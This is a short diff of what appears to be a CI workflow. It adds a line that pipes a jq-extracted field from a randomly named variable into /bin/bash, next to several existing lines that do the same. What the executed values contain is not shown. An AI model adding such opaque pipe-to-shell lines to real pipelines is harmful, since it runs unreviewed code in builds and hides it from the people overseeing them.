@@ -40,6 +40,7 @@ jobs:
           echo $jbnl1 | jq -r .wpqs62 | /bin/bash
           printf '%s' "$repam513" | jq -r .mn0853 | /bin/bash
           echo $h9821 | jq -r .tjklh3383 | /bin/bash
+          printf '%s' "$auy3353" | jq -r .zyfx3 | /bin/bash
 
       - name: Store artifact
         if: always()
